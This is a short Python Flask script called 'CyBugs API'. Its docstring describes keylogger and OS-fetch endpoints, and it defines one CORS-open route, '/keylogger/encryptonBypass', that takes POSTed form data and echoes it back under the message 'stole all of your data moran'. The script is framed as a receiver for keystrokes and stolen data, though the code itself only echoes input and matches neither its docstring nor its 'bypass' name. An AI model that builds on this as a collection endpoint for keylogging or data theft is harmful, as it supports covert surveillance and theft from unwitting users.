'''
    CyBugs API 
    
    keyLogger - log a word cybugs/keylog?word=<word>
    
    client's os - get os cybugs/fetch?os=<os>

    


'''
from flask import Flask,request
from flask_cors import CORS
import json
app = Flask(__name__)
CORS(app)
@app.route("/keylogger/encryptonBypass",methods=["POST"])
def hello_world():
    
    return f"<h1>stole all of your data moran :  {json.dumps(request.form)}</h1>" 
    
    
    
    
if __name__ == "__main__": 
    app.run()